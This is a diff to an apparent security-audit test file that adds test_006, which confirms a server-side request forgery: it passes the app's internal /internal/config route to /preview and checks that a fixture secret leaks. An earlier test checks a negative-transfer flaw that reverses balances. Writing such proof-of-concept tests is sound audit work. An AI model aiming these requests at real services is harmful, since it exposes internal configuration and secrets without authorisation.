@@ -57,3 +57,11 @@ def test_005_negative_transfer_reverses_funds():
     balances = r.json()
     assert balances["alice"] == 150, balances
     assert balances["bob"] == 50, balances
+
+
+def test_006_ssrf_preview_reaches_internal_config():
+    """FINDING-006: unrestricted fetch — internal-only route reachable via /preview."""
+    target = f"{BASE}/internal/config"
+    r = requests.get(f"{BASE}/preview", params={"url": target}, timeout=10)
+    assert r.status_code == 200, r.text
+    assert "SSRF-FIXTURE-SECRET" in r.text
